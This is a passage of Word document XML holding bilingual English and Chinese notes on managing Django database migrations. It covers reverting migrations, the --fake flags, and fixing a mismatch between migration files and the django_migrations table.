    <w:p w14:paraId="1E774170"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You can revert by migrating to the previous migration.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60161D3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For example, </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>if</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> your </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>last</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> two migrations are:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B6B6AF2"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0010_previous_migration</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72F2A6F2"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0011_migration_to_revert</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61FB745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Then you would </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>do</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06AC2E11"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./manage.py migrate my_app 0010_previous_migration </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="166FF594"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You can </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>then</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> delete migration 0011_migration_to_revert.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="602CF97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If you</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>'re using Django 1.8+, you can show the names of all the migrations with</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="386B4E1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./manage.py showmigrations my_app</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07A02FAA"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To reverse all migrations </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="0000FF"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>for</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> an app, you can run:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="275135AC"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./manage.py migrate my_app zero</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7184C1B3" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:before="150" w:after="150" w:line="240" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>、到数据库表</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>django_migrations</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中查看</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>中看看</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>列</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D07F567" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00B61AC7" w:rsidP="00652128">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76DE858C" wp14:editId="51B63D86">
            <wp:extent cx="4564380" cy="286512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64380" cy="2865120"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="055E3030" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:before="150" w:after="150"/>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 2</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>、到项目对应的</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>模块中打开</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>migrations</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>文件查看生成的文件与数据库</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>app</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>列中的是不是一样</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="096B44A8" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00B61AC7" w:rsidP="00652128">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:before="150" w:after="150"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:noProof/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="57632CA6" wp14:editId="12B4B685">
            <wp:extent cx="2476500" cy="27355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6500" cy="2735580"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7335A2BE" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing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3.</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>找到哪里不一致的文件，然后使用</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>python manage.py --fake [版本名字]</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>，将这个版本标记为已经映射</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BB13853" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8"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如果还是报错就按照下面执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08CAB82D"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800080"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、删除指定app下migrations和数据库表django_migrations中和这个app相关的版本号，</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="640838BD"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800080"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、将模型中的字段和数据库中的字段保持一致，再使用命令python manage.py makemigrations重新生成一个初始化的迁移脚本。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A7592D0"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800080"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>3</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>、再使用命令python manage.py makemigrations --fake-initial来将这个初始化的迁移脚本标记为已经映射。之后再修改就没有问题了。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B8DFB7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更多关于迁移脚本的。请查看官方文档：https:</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="008000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>//docs.djangoproject.com/en/2.0/topics/migrations/</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="10F5167E" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8"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makemigrations</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>migrate</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>时</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
        <w:t>都做了什么？</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="256CA8D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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>makemigrations：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5495AAAD"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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>执行makemigrations时检测models文件变化，在migrations文件夹中生成变更的sql的py文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0CC18AA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b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>migrate：检测django_migrations表，迁移过的表会记录在其中并不再执行migrate，未找到执行记录则进行migrate</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="77F0563E" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00B61AC7" w:rsidP="00B61AC7">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:line="380" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="left"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="20"/>
          <w:szCs w:val="20"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>不要随意删除</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>django</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>项目目录下的</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t> </w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>migrations</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>文件夹，里面会记录</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>models</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>文件每次</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>makemigrations</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>操作，误删后，</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>makemigrations</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:color w:val="FF0000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="27"/>
          <w:szCs w:val="27"/>
        </w:rPr>
        <w:t>会重新生成</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A29903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8000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>#执行python manage.py makemigrations命令时报错问题及解决办法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078E8C6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在修改了models.py后，有些用户会喜欢用python manage.py makemigrations生成对应的py代码。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02AC75D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但有时执行python manage.py makemigrations命令(也可能人比较皮，把migrations文件夹给删了)，会提示</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="800000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>"No changes detected."</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:eastAsia="宋体" w:hAnsi="宋体" w:cs="宋体"/>
          <w:color w:val="000000"/>
          <w:kern w:val="0"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 可能有用的解决方式如下：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2D31F56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先 python manage.py makemigrations --empty yourappname 生成一个空的initial.py</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70A035A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再 python manage.py makemigrations 生成原先的model对应的migration file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D373237" w14:textId="77777777" w:rsidR="00B61AC7" w:rsidRPr="009B62F8" w:rsidRDefault="00B61AC7" w:rsidP="00BC6A81">
      <w:pPr>
        <w:widowControl/>
        <w:shd w:val="clear" w:color="auto" w:fill="FEFEF2"/>
        <w:spacing w:line="440" w:lineRule="exact"/>
        <w:contextualSpacing/>
        <w:jc w:val="center"/>
        <w:outlineLvl w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>django-</w:t>
      </w:r>
      <w:r w:rsidRPr="009B62F8">
        <w:rPr>
          <w:rFonts w:ascii="Verdana" w:eastAsia="宋体" w:hAnsi="Verdana" w:cs="宋体"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000"/>
          <w:kern w:val="36"/>
          <w:sz w:val="42"/>
          <w:szCs w:val="42"/>
        </w:rPr>
        <w:t>关于</w:t>
      </w:r>
